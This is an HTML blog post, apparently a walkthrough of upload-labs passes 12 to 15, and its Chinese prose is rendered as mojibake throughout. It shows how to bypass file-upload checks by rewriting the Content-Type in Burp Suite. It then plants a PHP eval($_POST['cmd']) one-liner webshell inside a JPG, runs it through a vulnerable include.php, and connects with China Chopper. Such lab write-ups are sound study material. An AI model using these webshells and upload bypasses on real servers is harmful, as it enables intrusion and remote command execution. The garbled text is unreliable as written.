<p>çœ‹åˆ°æ˜¯åœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œåˆ¤æ–­å°±åº”è¯¥çŸ¥é“åƒä¸Šé“é¢˜ç›®ä¸­, ä½¿ç”¨æµè§ˆå™¨çš„æ‰‹æ®µåº”è¯¥æ˜¯è¡Œä¸é€šçš„äº†, è¦æƒ³åŠæ³•éª—è¿‡æœåŠ¡å™¨. åœ¨è¿™é‡Œ, æˆ‘ä»¬ä½¿ç”¨å·¥å…·<code>Burp Suite</code>å¯¹éœ€è¦ä¸Šä¼ çš„æ•°æ®åŒ…è¿›è¡Œä¿®æ”¹.<br>å…·ä½“æ­¥éª¤:</p>
<ol>
<li>æ‰“å¼€<code>Burp Suite</code>é»˜è®¤ä»£ç†ç«¯å£<code>127.0.0.1:8080</code>ï¼Œ<code>intercept</code>æ ‡ç­¾ä¸­å¼€å¯æ•°æ®æ‹¦æˆªåŠŸèƒ½ intercept is onã€‚<figure class="image-box">
                <img src="https://imgsa.baidu.com/exp/w=480/sign=935ab9728f025aafd3327fc3cbecab8d/267f9e2f070828385d7923a6b599a9014c08f108.jpg" alt title class>
                <p></p>
            </figure></li>
<li>ä¸Šä¼ <code>test.php</code>çš„æ–‡ä»¶ï¼Œæç¤ºæ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ã€‚<figure class="image-box">
                <img src="https://imgsa.baidu.com/exp/w=480/sign=81f314465cda81cb4ee682c56267d0a4/8326cffc1e178a82959c8312fb03738da877e8e4.jpg" alt title class>
                <p></p>
            </figure></li>
<li>æ‰“å¼€<code>Burp Suite</code>é»˜è®¤ä»£ç†ç«¯å£<code>127.0.0.1:8080</code>ï¼Œ<code>intercept</code>æ ‡ç­¾ä¸­å¼€å¯æ•°æ®æ‹¦æˆªåŠŸèƒ½intercept is onã€‚<figure class="image-box">
                <img src="https://imgsa.baidu.com/exp/w=480/sign=935ab9728f025aafd3327fc3cbecab8d/267f9e2f070828385d7923a6b599a9014c08f108.jpg" alt title class>
                <p></p>
            </figure></li>
<li>chromeæµè§ˆå™¨ä»£ç†è®¾ç½®ï¼Œ<code>127.0.0.1:8080</code>,è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯<code>SwitchyOmega</code>æ’ä»¶è¿›è¡Œå¿«é€Ÿè®¾ç½®ã€‚<figure class="image-box">
                <img src="https://imgsa.baidu.com/exp/w=480/sign=75d5dcba5e43fbf2c52ca72b807fca1e/e61190ef76c6a7ef7d925194f0faaf51f2de66c8.jpg" alt title class>
                <p></p>
            </figure></li>
<li>é‡æ–°é€‰æ‹©<code>test.php</code>æ–‡ä»¶è¿›è¡Œä¸Šä¼ ï¼Œ<code>Burp Suite</code>æ‹¦æˆªåˆ°æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…ã€‚(å¦‚æœåœ¨æœ¬åœ°éƒ¨ç½²é¶åœº, <code>Burp Suite</code>å¯èƒ½ä¼šæ‹¦æˆªä¸åˆ°æ•°æ®åŒ…?)<figure class="image-box">
                <img src="https://imgsa.baidu.com/exp/w=480/sign=c8bec5759d529822053338cbe7cb7b3b/b3119313b07eca80eba5c0559c2397dda04483e4.jpg" alt title class>
                <p></p>
            </figure></li>
<li>å°†æ‹¦æˆªæ•°æ®åŒ…ä¸­çš„<code>content-type:application/octet-stream</code>æ›´æ”¹ä¸º<code>content-type:image/jpeg</code>ï¼Œç‚¹å‡»<code>forward</code>è½¬å‘ã€‚<figure class="image-box">
                <img src="https://imgsa.baidu.com/exp/w=480/sign=0a5954a7b1315c6043956ae7bdb0cbe6/9e3df8dcd100baa127b6bf094a10b912c9fc2eee.jpg" alt title class>
                <p></p>
            </figure></li>
<li>æŸ¥çœ‹ä¸Šä¼ ç½‘é¡µç•Œé¢ï¼Œå‘ç°æ–‡ä»¶å·²ç»ä¸Šä¼ æˆåŠŸã€‚<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/baidu.jpg" alt title class>
                <p></p>
            </figure>
<h3 id="pass13"><a href="#pass13" class="headerlink" title="pass13:"></a>pass13:</h3>é¢˜ç›®è¦æ±‚ï¼š<blockquote>
<p>ä¸Šä¼ å›¾ç‰‡é©¬åˆ°æœåŠ¡å™¨ã€‚<br>æ³¨æ„ï¼š</p>
</blockquote>
</li>
<li>ä¿è¯ä¸Šä¼ åçš„å›¾ç‰‡é©¬ä¸­ä»ç„¶åŒ…å«å®Œæ•´çš„<code>ä¸€å¥è¯</code>æˆ–<code>webshell</code>ä»£ç ã€‚</li>
<li>ä½¿ç”¨<code>æ–‡ä»¶åŒ…å«æ¼æ´</code>èƒ½è¿è¡Œå›¾ç‰‡é©¬ä¸­çš„æ¶æ„ä»£ç ã€‚</li>
<li>å›¾ç‰‡é©¬è¦<code>.jpg</code>,<code>.png</code>,<code>.gif</code>ä¸‰ç§åç¼€éƒ½ä¸Šä¼ æˆåŠŸæ‰ç®—è¿‡å…³ï¼</li>
</ol>
<p>å¥½çš„ï¼Œä»€ä¹ˆæ˜¯<code>å›¾ç‰‡é©¬</code>ï¼Ÿ<br>ç™¾åº¦äº†ä¸‹ç›¸å…³çš„æ¦‚å¿µå’Œåˆ¶ä½œæ–¹æ³•ï¼Œå…¶å®è¯´ç™½äº†ï¼Œå›¾ç‰‡é©¬å°±æ˜¯åœ¨å›¾ç‰‡æ–‡ä»¶ä¸­å…¥æ¶æ„ä»£ç ï¼Œä½†ä¾ç„¶ä¿æŒæ–‡ä»¶ç±»å‹æ˜¯å›¾ç‰‡æ ¼å¼ï¼ˆ<code>.jpg</code>,<code>.png</code>,<code>.gif</code>ç­‰ï¼‰çš„æœ¨é©¬æ–‡ä»¶ã€‚<br>æœ€ç®€å•çš„å›¾ç‰‡é©¬å½“ç„¶å°±æ˜¯åœ¨å›¾ç‰‡ä¸­æ’å…¥<code>ä¸€å¥è¯</code>ç”Ÿæˆçš„,</p>
<p>åˆ¶ä½œæ–¹æ³•å¾ˆç®€å•, éšä¾¿æ‰¾ä¸ªå›¾ç‰‡( ä»¥<code>jpg</code>ä¸ºä¾‹ ), ä»¥è®°äº‹æœ¬æ‰“å¼€, åœ¨æœ«å°¾åŠ ä¸Š<code>ä¸€å¥è¯</code>çš„ä»£ç :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¹¶ä¿å­˜ä¸‹æ¥å°±åˆ¶ä½œå¥½äº†. ( åœ¨æŸç¯‡åšå®¢ä¸­çœ‹åˆ°, å¯ä»¥åªä¿ç•™åŸæ–‡ä»¶çš„å‰ä¸‰è¡Œç„¶åå†åŠ å…¥ä»£ç , å› ä¸ºæœ‰æ—¶å›¾ç‰‡è¿‡å¤§ä¼šå½±å“å›¾ç‰‡é©¬çš„è¿è¡Œ. )<br>ä¹Ÿå¯ä»¥ç”¨cmd, è¾“å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy  1.jpg/b+2.php/a  3.jpg</span><br></pre></td></tr></table></figure>

<p><code>1.jpg</code> æ˜¯åŸå›¾ç‰‡æ–‡ä»¶, <code>2.php</code>æ˜¯<code>ä¸€å¥è¯</code>, <code>3.jpg</code>å°±æ˜¯ä¸¤ä¸ªæ–‡ä»¶åˆå¹¶åçš„æ–°æ–‡ä»¶.<br><code>/b</code>æ˜¯ä»¥äºŒè¿›åˆ¶å½¢å¼,é€‚ç”¨äºå›¾ç‰‡éŸ³é¢‘ç­‰æ–‡ä»¶<br><code>/a</code>æ˜¯asciiå½¢å¼,é€‚ç”¨äº<code>txt</code>,<code>php</code>ç­‰æ–‡æœ¬æ–‡ä»¶<br><font size="2" color="green">å°å£°bb : ç„¶è€Œäº²æµ‹å¥½åƒæ²¡æœ‰ä»€ä¹ˆåŒºåˆ«</font></p>
<p>æŠŠåˆæˆå¥½çš„æ–‡ä»¶æ”¾åˆ°æµ‹è¯•çš„ç›®å½•ä¸‹, å°è¯•ä½¿ç”¨èœåˆ€è¿æ¥. </p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/jpg.png" alt title class>
                <p></p>
            </figure>
<p>.<br>.<br>.<br>ä¼šå‘ç°è¿æ¥ä¸ä¸Š :|</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/error.png" alt title class>
                <p></p>
            </figure>
<p>è¿™æ˜¯å› ä¸ºèœåˆ€åªèƒ½å’Œ<code>php</code>,<code>asp</code>,<code>aspx</code>ç­‰è„šæœ¬æ–‡ä»¶è¿æ¥. </p>
<p>å¦‚æœæŠŠåç¼€æ”¹æˆ<code>php</code>,å†æ¬¡è¿æ¥â€¦</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/php.png" alt title class>
                <p></p>
            </figure>

<p>å¯ä»¥å‘ç°æ­£å¸¸å·¥ä½œ. :)<br>ä½†æ˜¯è¿™ä¸è¶³ä»¥è§£å†³è¿™ä¸ªé¢˜ç›®.<br>å› ä¸ºé¢˜ç›®åªèƒ½æäº¤<code>.jpg</code>ç­‰å›¾ç‰‡æ–‡ä»¶, æ‰€ä»¥è¦ç”¨é¢˜ç›®ä¸­çš„<code>æ–‡ä»¶åŒ…å«æ¼æ´</code>.<br>çœ‹ä¸‹é¢˜ç›®ä¸­æä¾›çš„<code>include.php</code>çš„ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">æœ¬é¡µé¢å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç”¨äºæµ‹è¯•å›¾ç‰‡é©¬æ˜¯å¦èƒ½æ­£å¸¸è¿è¡Œï¼</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>); </span><br><span class="line">$file = $_GET[<span class="string">'file'</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))&#123; </span><br><span class="line">    <span class="keyword">include</span> $file; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    show_source(<span class="keyword">__file__</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ„Ÿè§‰<code>GET()</code>å‡½æ•°åº”è¯¥æ˜¯å…³é”®ç‚¹<br>ç™¾åº¦äº†ä¸‹, <code>GET()</code>å‡½æ•°åœ¨è¿™çš„ä½¿ç”¨æ–¹æ³•æ˜¯åœ¨URLå¤„è·å–å‚æ•°.<br>æ¯”å¦‚, æˆ‘åœ¨URL<code>http://æŸè·¯å¾„/include.php</code>ååŠ ä¸Š<code>?file=test.txt</code>, ä¹Ÿå°±æ˜¯<code>http://æŸè·¯å¾„/include.php?file=test.txt</code>é‚£ä¹ˆå½“æˆ‘è®¿é—®è¿™ä¸ªURLæ—¶, è„šæœ¬å°±ä¼šè‡ªåŠ¨æ‰¾åˆ°<code>test.txt</code>å¹¶æŠŠå…¶å†…å®¹æ”¾åˆ°å½“å‰<code>include.php</code>ä¸­ä¸€èµ·æ‰§è¡Œ.<br>è¿™æ ·,æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>æ–‡ä»¶åŒ…å«æ¼æ´</code>, ä½¿æœåŠ¡å™¨åœ¨è¿è¡Œ<code>include.php</code>æ—¶æŠŠæˆ‘ä»¬çš„æœ¨é©¬ä¸€èµ·è¿è¡Œäº†.</p>
<p>åœ¨æµè§ˆå™¨ä¸­æµ‹è¯•ä¸‹,</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/ceshi.png" alt title class>
                <p></p>
            </figure>
<p>å¯ä»¥å‘ç°, <code>å›¾ç‰‡é©¬</code>çš„æ•°æ®å·²ç»è¢«è®¿é—®åˆ°äº†.(ä½†æ˜¯æ²¡æœ‰å‘ç°<code>phpè„šæœ¬</code>å›æ˜¾, æš‚æ—¶å­˜ç–‘ :/ )</p>
<p>åœ¨ä½¿ç”¨èœåˆ€å°è¯•è¿æ¥</p>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/sucessful.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="http://whoisyourdaddy.cf/picture/C.png" alt title class>
                <p></p>
            </figure>
<p>æˆåŠŸæ‹¿åˆ°äº† <code>webshell</code>,è¿™é“é¢˜åˆ°è¿™å°±ç®—æ˜¯ç»“æŸäº†, å…¶å®ƒçš„ä¸¤ä¸ªå›¾ç‰‡ç±»å‹åº”è¯¥ä¹Ÿéƒ½å·®ä¸å¤š, è¿™é‡Œä¸å¤šèµ˜è¿°. :)</p>
<h4 id="é¡ºä¾¿æä¸€ä¸‹"><a href="#é¡ºä¾¿æä¸€ä¸‹" class="headerlink" title="é¡ºä¾¿æä¸€ä¸‹"></a>é¡ºä¾¿æä¸€ä¸‹</h4><p>æ¯æ¬¡ç”¨<code>ä¸€å¥è¯</code>æˆ–è€…ç”¨å¤§é©¬å¾—åˆ°<code>webshell</code>å, ç›®å½•ä¸‹å°±ä¼šå‘ç°æœ‰<code>$RECYCLE.BIN</code>å’Œsystem volume informationè¿™ä¿©ä¸ªæ–‡ä»¶å¤¹. åœ¨è¿™é‡Œè´´ä¸‹ç›¸å…³èµ„æ–™:<br><a href="https://blog.csdn.net/sinat_33718563/article/details/78837510" target="_blank" rel="noopener">rså‹¿å¿˜åˆå¿ƒ</a>:</p>
<blockquote>
<p><code>$RECYCLE.BIN</code> :é¦–å…ˆè¯´æ˜è¿™æ˜¯ç³»ç»Ÿæ–‡ä»¶ ä¸æ˜¯ç—…æ¯’<code>$RECYCLE.BIN</code> ä¸æ˜¯åƒä¸€ä¸ªå›æ”¶ç«™ï¼Œå®ƒå°±æ˜¯å›æ”¶ç«™ï¼æ¯ä¸ªç›˜éƒ½æœ‰ï¼ä½ åœ¨æ¯ä¸ªç›˜åˆ é™¤çš„ä¸œè¥¿éƒ½ä¼šç•™åœ¨å„è‡ªç›˜çš„å›æ”¶ç«™ï¼ˆå³ <code>$RECYCLE.BIN</code>ï¼‰é‡Œï¼Œè€Œæ¡Œé¢ä¸Šçš„å°±æ˜¯æ€»çš„å›æ”¶ç«™äº†ã€‚å„è‡ªç›˜é‡Œçš„<code>$RECYCLE.BIN</code> å†ä½ æ¸…ç©ºæ¡Œé¢ä¸Šçš„å›æ”¶ç«™åä¹Ÿå°±è‡ªåŠ¨æ¸…é™¤äº†ï¼</p>
</blockquote>
<p><a href>tangpeicheng</a>:</p>
<blockquote>
<p>system volume information:<br>å…¶ä¸­æ–‡åç§°å¯ä»¥ç¿»è¯‘ä¸ºâ€œç³»ç»Ÿå·æ ‡ä¿¡æ¯â€ã€‚è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œå°±å­˜å‚¨ç€ç³»ç»Ÿè¿˜åŸçš„å¤‡ä»½ä¿¡æ¯ã€‚è¿™é‡Œæ¶‰åŠåˆ°â€œç³»ç»Ÿè¿˜åŸâ€,â€œç³»ç»Ÿè¿˜åŸâ€æ˜¯Windows XPæœ€å®ç”¨çš„åŠŸèƒ½ä¹‹ä¸€ï¼Œå®ƒé‡‡ç”¨â€œå¿«ç…§â€çš„æ–¹å¼è®°å½•ä¸‹ç³»ç»Ÿåœ¨ç‰¹å®šæ—¶é—´çš„çŠ¶æ€ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„â€œè¿˜åŸç‚¹â€ï¼Œç„¶ååœ¨éœ€è¦çš„æ—¶å€™æ ¹æ®è¿™äº›ä¿¡æ¯åŠ ä»¥è¿˜åŸã€‚</p>
</blockquote>
<h3 id="pass14"><a href="#pass14" class="headerlink" title="pass14:"></a>pass14:</h3><p>åŒpass13</p>
<h3 id="pass15"><a href="#pass15" class="headerlink" title="pass15:"></a>pass15:</h3><p>åŒpass14<br>è™½ç„¶13ï¼Œ14ï¼Œ15å¯ä»¥ç”¨åŒæ ·çš„æ–¹æ³•è¿‡å…³.<br>ä½†æ˜¯æˆ‘ä»¬ä¸å¦¨ä»”ç»†çš„åˆ†æä¸‹ä»£ç , ä½“ä¼šåŒºåˆ«</p>
<h4 id="pass14ä»£ç "><a href="#pass14ä»£ç " class="headerlink" title="pass14ä»£ç :"></a>pass14ä»£ç :</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å‡ºé”™ï¼"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºè¿™é‡Œå…ˆæ˜¯å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°<br><code>isImage($filename)</code><br>è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å¯ä»¥æ¨æµ‹æ˜¯åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºå›¾ç‰‡ç±»å‹ï¼Œå¦‚æœæ˜¯åˆ™è¿”å›å…·ä½“ç±»å‹(.jpg,.png,.git)ï¼Œå¦‚æœä¸æ˜¯åˆ™è¿”å› false. </p>
<p>è¿™å…¶ä¸­è¿˜æœ‰ä¸¤ä¸ªå‡½æ•°<code>getimagesize()</code>å’Œ<code>image_type_to_extension()</code><br>å…¶ä¸­<code>getimagesize()</code>ä¼šä»¥æ•°ç»„çš„å½¢å¼è¿”å›å›¾åƒçš„ä¸€ç»„ä¿¡æ¯, å…¶ç¬¬äºŒä¸ªå…ƒç´ (<code>info[2]</code>)ä¿å­˜çš„æ˜¯å›¾ç‰‡ç±»å‹. ä½†æ˜¯æ˜¯ä»¥æ•°å­—ç¼–ç çš„å½¢å¼(1,2,3â€¦)ä¿å­˜, æ‰€ä»¥éœ€è¦ä½¿ç”¨<code>image_type_to_extension($info[2])</code>å°†æ•°å­—è½¬ä¸ºå­—ç¬¦ä¸².</p>
<p>ç¨‹åºä¸»ä½“è¿™é‡Œå‡ºç°äº†å‡ ä¸ªphpè„šæœ¬é¢„å®šä¹‰çš„å¸¸é‡</p>
<ul>
<li><code>$_POST</code>å¯ä»¥ç”¨æ¥æ”¶é›†æ¥è‡ª<code>method = &quot;post&quot;</code>çš„è¡¨å•çš„æ•°æ®. è¡¨å•åŸŸçš„åç§°ä¼šè‡ªåŠ¨æˆä¸º <code>$_POST</code> æ•°ç»„ä¸­çš„é”®. æ‰€ä»¥è¿™é‡Œçš„ <code>&#39;submit&#39;</code>åº”è¯¥æ˜¯æŸä¸ªè¡¨å•åŸŸçš„åç§°.<br>äº‹å®ä¸Š, é€šè¿‡åœ¨æµè§ˆå™¨ä¸­ä½¿ç”¨å¼€å‘è€…å·¥å…·åˆ†æç½‘é¡µä¸­è¡¨å•ä»£ç :<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>è¯·é€‰æ‹©è¦ä¸Šä¼ çš„å›¾ç‰‡ï¼š<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"input_file"</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"upload_file"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"button"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"ä¸Šä¼ "</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>è¿™åº”è¯¥å°±æ˜¯ä¸Šè¿°çš„è¡¨å•, ç”¨æ¥æ”¶é›†ä¸Šä¼ æ–‡ä»¶çš„æ•°æ®. è€ŒæœåŠ¡å™¨æ¥å—åˆ°è¡¨å•çš„æ•°æ®åä¼šè‡ªåŠ¨å°†å…¶ä¸­çš„ä¿¡æ¯ä¿å­˜åœ¨<code>$_POST</code>æ•°ç»„ä¸­ä¾›è„šæœ¬è°ƒç”¨. </p>
<ul>
<li><p><code>$_FILES</code>POSTäº§ç”Ÿçš„è¡¨å•å­˜å‚¨åœ¨ <code>$_POST</code>ä¸­,é‚£ä¹ˆä¸Šä¼ çš„æ–‡ä»¶çš„ç›¸å…³ä¿¡æ¯ä¿å­˜åœ¨<code>$_FILES</code>ä¸­.<br>å…¶æœ‰ä¸¤ä¸ªä¸‹æ ‡.ç¬¬ä¸€ä¸ªæ˜¯æ–‡ä»¶çš„<code>name</code>, æ­¤å¤„å³ä¸ºè¡¨å•ä¸­çš„<code>upload_file</code>.ç¬¬äºŒä¸ªåˆ™æ˜¯æ–‡ä»¶çš„æŸäº›å…·ä½“å‚æ•°å¯ä»¥æ˜¯:â€nameâ€, â€œtypeâ€, â€œsizeâ€, â€œtmp_nameâ€ æˆ– â€œerrorâ€ã€‚å°±åƒè¿™æ ·ï¼š</p>
<ul>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;name&quot;]</code> - è¢«ä¸Šä¼ æ–‡ä»¶çš„åç§°</li>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;type&quot;]</code> - è¢«ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</li>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;size&quot;]</code> - è¢«ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œä»¥å­—èŠ‚è®¡</li>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;tmp_name&quot;]</code> - å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶çš„ä¸´æ—¶å‰¯æœ¬çš„åç§°</li>
<li><code>$_FILES[&quot;upload_file&quot;][&quot;error&quot;]</code>- ç”±æ–‡ä»¶ä¸Šä¼ å¯¼è‡´çš„é”™è¯¯ä»£ç <h4 id="pass15ä»£ç "><a href="#pass15ä»£ç " class="headerlink" title="pass15ä»£ç :"></a>pass15ä»£ç :</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//éœ€è¦å¼€å¯php_exifæ¨¡å—</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å‡ºé”™ï¼"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<p>å…¶ä»–éƒ¨åˆ†å¤§åŒå°å¼‚,ä¸»è¦æ˜¯<code>exif_imagetype(&amp;filename)</code>å‡½æ•°</p>
<blockquote>
<p>æœ¬å‡½æ•°å¯ç”¨æ¥é¿å…è°ƒç”¨å…¶å®ƒ exif å‡½æ•°ç”¨åˆ°äº†ä¸æ”¯æŒçš„æ–‡ä»¶ç±»å‹ä¸Šæˆ–å’Œ <code>$_SERVER[&#39;HTTP_ACCEPT&#39;]</code> ç»“åˆä½¿ç”¨æ¥æ£€æŸ¥æµè§ˆå™¨æ˜¯å¦å¯ä»¥æ˜¾ç¤ºæŸä¸ªæŒ‡å®šçš„å›¾åƒã€‚</p>
</blockquote>
